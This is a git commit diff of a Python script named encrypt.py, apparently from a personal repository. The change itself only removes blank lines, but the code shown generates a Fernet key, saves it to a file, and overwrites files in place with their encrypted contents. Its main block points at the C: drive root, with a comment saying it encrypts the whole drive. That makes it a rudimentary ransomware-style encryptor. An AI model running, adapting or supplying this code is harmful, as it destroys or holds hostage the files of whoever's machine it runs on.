1b1121fbd657390fdd68fcec2b31f58ca492d207
maisyrat666 <114204637+maisyrat666@users.noreply.github.com>
2022-10-26 21:57:01 -0500

    Update encrypt.py

--- encrypt.py
+++ encrypt.py
@@ -1,17 +1,11 @@
 from cryptography.fernet import Fernet
 import os
-
-
 def generar_key():
     key = Fernet.generate_key()
     with open('key.key', 'wb') as key_file:
         key_file.write(key)
-
-
 def cargar_key():
     return open('key.key', 'rb').read()
-
-
 def encrypt(items, key):
     f = Fernet(key)
     for item in items:
@@ -20,8 +14,6 @@ def encrypt(items, key):
         encrypted_data = f.encrypt(file_data)
         with open(item, 'wb') as file:
             file.write(encrypted_data)
-
-
 if __name__ == '__main__':
     path_to_encrypt = 'C:\\' #path to directory Currently encrpyts all C drive
     items = os.listdir(path_to_encrypt)
